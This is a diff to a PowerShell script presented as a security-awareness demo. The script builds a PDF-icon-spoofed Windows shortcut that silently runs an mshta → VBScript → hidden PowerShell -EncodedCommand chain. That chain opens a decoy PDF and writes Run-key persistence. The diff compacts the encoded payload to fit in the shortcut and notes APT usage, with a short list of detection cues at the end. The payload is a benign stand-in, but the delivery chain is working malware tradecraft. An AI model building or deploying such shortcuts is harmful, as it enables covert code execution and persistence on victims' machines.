@@ -70,6 +70,12 @@ $decoyPath  = Join-Path $env:TEMP  "$DocName.pdf"
 $logPath    = Join-Path $env:TEMP  "demo_execution_log.txt"
 $regRunPath = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
 
+# Ensure output directory exists
+if (-not (Test-Path $OutputDir)) {
+    New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
+    Write-Host "    Created output dir: $OutputDir" -ForegroundColor DarkGray
+}
+
 # ─── Banner ───────────────────────────────────────────────────────────────────
 Write-Host ""
 Write-Host "  +---------------------------------------------------------+" -ForegroundColor Cyan
@@ -81,7 +87,7 @@ Write-Host ""
 # ═════════════════════════════════════════════════════════════════════════════
 # STEP 1 — Create a valid decoy PDF
 # ═════════════════════════════════════════════════════════════════════════════
-Write-Host "[1/5] Building decoy PDF..." -ForegroundColor Yellow
+Write-Host "[1/4] Building decoy PDF..." -ForegroundColor Yellow
 
 function New-DecoyPDF {
     param([string]$FilePath, [string]$Title)
@@ -179,7 +185,7 @@ Write-Host "    -> $decoyPath" -ForegroundColor DarkGray
 # ═════════════════════════════════════════════════════════════════════════════
 # STEP 2 — Resolve PDF application icon from registry
 # ═════════════════════════════════════════════════════════════════════════════
-Write-Host "[2/5] Resolving PDF icon (spoofing surface)..." -ForegroundColor Yellow
+Write-Host "[2/4] Resolving PDF icon (spoofing surface)..." -ForegroundColor Yellow
 
 function Get-PDFIconPath {
     # Primary: read default handler icon from HKCR / HKCU registry
@@ -215,58 +221,36 @@ Write-Host "    -> $pdfIcon" -ForegroundColor DarkGray
 # ═════════════════════════════════════════════════════════════════════════════
 # STEP 3 — Build the silent payload (runs when victim double-clicks LNK)
 # ═════════════════════════════════════════════════════════════════════════════
-Write-Host "[3/5] Building embedded payload block..." -ForegroundColor Yellow
+Write-Host "[3/4] Building and encoding embedded payload..." -ForegroundColor Yellow
 
-# Variables interpolated NOW (build time) — baked into the payload string:
-#   $decoyPath, $logPath, $PersistKey, $regRunPath
-# Variables escaped with backtick — evaluated at EXECUTION time:
-#   $env:COMPUTERNAME, $env:USERNAME, $PID, $env:USERDOMAIN, etc.
+# Payload is kept compact so the base64 stays well under WScript.Shell's
+# practical ~2047-char limit for LNK Arguments on modern Windows.
+#
+# Variables WITHOUT backtick  → interpolated at BUILD time (paths baked in)
+# Variables WITH backtick     → escaped, run at EXECUTION time inside the LNK
 
 $payloadPS = @"
-# [DEMO PAYLOAD] — executed silently by mshta -> PowerShell chain
-
-# Technique: Decoy document open (victim sees legitimate PDF, suspects nothing)
 Start-Process '$decoyPath'
-
-# Technique: HKCU Run key persistence (survives reboot; notepad.exe is benign stand-in)
-Set-ItemProperty -Path '$regRunPath' ``
-    -Name '$PersistKey' ``
-    -Value 'C:\Windows\notepad.exe' ``
-    -Force
-
-# Write execution evidence for demo review
-`$ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
-`$evidence = @(
-    '================================================================',
-    '[DEMO] LNK Payload Executed Successfully',
-    '================================================================',
-    "Timestamp : `$ts",
-    "System    : `$env:COMPUTERNAME",
-    "User      : `$env:USERDOMAIN\`$env:USERNAME",
-    "PID       : `$PID  (powershell.exe)",
-    "Parent    : mshta.exe -> vbscript -> WScript.Shell.Run(window=0)",
-    '',
-    'Techniques Demonstrated:',
-    '  [+] PDF icon spoofing via LNK IconLocation field',
-    '  [+] Extension hiding (.lnk hidden by Explorer by default)',
-    '  [+] Silent LOLBin chain: mshta -> vbscript -> PS -WindowStyle Hidden',
-    '  [+] -EncodedCommand to obscure payload from plain-text inspection',
-    '  [+] Decoy PDF opened simultaneously (victim unaware of attack)',
-    "  [+] Persistence: HKCU\...\Run\$PersistKey -> notepad.exe",
-    '',
-    'THIS IS A SECURITY AWARENESS DEMO — ALL PAYLOADS BENIGN',
-    '================================================================'
-)
-`$evidence -join [Environment]::NewLine | Out-File '$logPath' -Encoding UTF8 -Force
+Set-ItemProperty -Path '$regRunPath' -Name '$PersistKey' -Value 'C:\Windows\notepad.exe' -Force
+`$ts = Get-Date -f 'yyyy-MM-dd HH:mm:ss'
+@(
+    '[DEMO] LNK Payload Executed',
+    "Time   : `$ts",
+    "Host   : `$env:COMPUTERNAME",
+    "User   : `$env:USERDOMAIN\`$env:USERNAME",
+    "PID    : `$PID (powershell.exe -WindowStyle Hidden)",
+    "Chain  : LNK -> mshta.exe -> vbscript -> WScript.Shell.Run(0) -> PS -EncodedCommand",
+    "",
+    "Techniques: PDF icon spoof | Ext hide | mshta LOLBin | HKCU Run persist | Decoy doc",
+    "BENIGN DEMO -- ALL PAYLOADS SAFE"
+) -join [Environment]::NewLine | Out-File '$logPath' -Encoding UTF8 -Force
 "@
 
-# Encode as UTF-16LE Base64 — the format PowerShell -EncodedCommand expects
-$payloadB64 = [Convert]::ToBase64String(
-    [Text.Encoding]::Unicode.GetBytes($payloadPS)
-)
+# UTF-16LE + Base64 — the exact encoding powershell.exe -EncodedCommand expects
+$payloadB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payloadPS))
 
-Write-Host "    Payload: $($payloadPS.Split([Environment]::NewLine).Count) lines" -ForegroundColor DarkGray
-Write-Host "    Encoded: $($payloadB64.Length) chars (Base64 UTF-16LE)" -ForegroundColor DarkGray
+Write-Host "    Payload : $($payloadPS.Length) chars" -ForegroundColor DarkGray
+Write-Host "    Encoded : $($payloadB64.Length) chars (fits inside single LNK)" -ForegroundColor DarkGray
 
 # ═════════════════════════════════════════════════════════════════════════════
 # STEP 4 — Build LNK arguments (mshta silent execution technique)
@@ -277,6 +261,9 @@ Write-Host "[4/4] Assembling LNK file..." -ForegroundColor Yellow
 #    Window style 0 = vbHide — process starts completely invisible.
 #    No cmd.exe flash, no PowerShell window, nothing visible to victim.
 #    Documented APT usage: APT36, Lazarus, Gamaredon, QakBot.
+#
+#    The full PS command + base64 becomes the Run argument — no file dropped,
+#    no network touch. Single LNK contains the entire attack.
 $psCmd     = "powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $payloadB64"
 $vbsInline = 'vbscript:Execute("CreateObject(""WScript.Shell"").Run ""' + $psCmd + '"",0,False:close")'
 
@@ -319,7 +306,8 @@ Write-Host "  ---------" -ForegroundColor DarkGray
 Write-Host "  LNK (victim opens this) : $lnkPath" -ForegroundColor Cyan
 Write-Host "  Decoy PDF               : $decoyPath" -ForegroundColor Gray
 Write-Host "  Execution log           : $logPath  (written when LNK runs)" -ForegroundColor Gray
-Write-Host "  Persistence             : $regRunPath\$PersistKey  (written when LNK runs)" -ForegroundColor Gray
+Write-Host "  Persistence             : HKCU\...\Run\$PersistKey  (written when LNK runs)" -ForegroundColor Gray
+Write-Host "  Payload                 : embedded in LNK as Base64 -EncodedCommand  (no extra files)" -ForegroundColor Gray
 Write-Host ""
 Write-Host "  Attack Chain (victim perspective)" -ForegroundColor White
 Write-Host "  ----------------------------------" -ForegroundColor DarkGray
@@ -327,7 +315,7 @@ Write-Host "  1. Victim sees '$DocName.pdf' on Desktop with PDF icon" -Foregroun
 Write-Host "  2. Victim double-clicks it" -ForegroundColor Gray
 Write-Host "  3. Windows launches mshta.exe (LOLBin, signed by Microsoft)" -ForegroundColor Gray
 Write-Host "  4. mshta executes inline VBScript, WScript.Shell.Run(window=0)" -ForegroundColor Gray
-Write-Host "  5. PowerShell -WindowStyle Hidden -EncodedCommand runs silently" -ForegroundColor Gray
+Write-Host "  5. PowerShell -WindowStyle Hidden -EncodedCommand <base64> runs silently" -ForegroundColor Gray
 Write-Host "  6. Decoy PDF opens in foreground -- victim sees normal document" -ForegroundColor Gray
 Write-Host "  7. Persistence written to HKCU Run (survives reboot)" -ForegroundColor Gray
 Write-Host "  8. Execution log written to %TEMP% as evidence" -ForegroundColor Gray
@@ -336,7 +324,7 @@ Write-Host ""
 Write-Host "  ENS Detection Opportunities" -ForegroundColor White
 Write-Host "  ----------------------------" -ForegroundColor DarkGray
 Write-Host "  [!] mshta.exe -> powershell.exe parent-child (HIPS / Expert Rules)" -ForegroundColor Red
-Write-Host "  [!] PowerShell -EncodedCommand + -WindowStyle Hidden (suspicious flags)" -ForegroundColor Red
+Write-Host "  [!] PowerShell -WindowStyle Hidden -EncodedCommand (obfuscated payload in cmdline)" -ForegroundColor Red
 Write-Host "  [!] Registry Run key write from mshta.exe process tree" -ForegroundColor Red
 Write-Host "  [!] LNK TargetPath = mshta.exe (atypical shortcut target)" -ForegroundColor Red
 if ($PadArguments) {
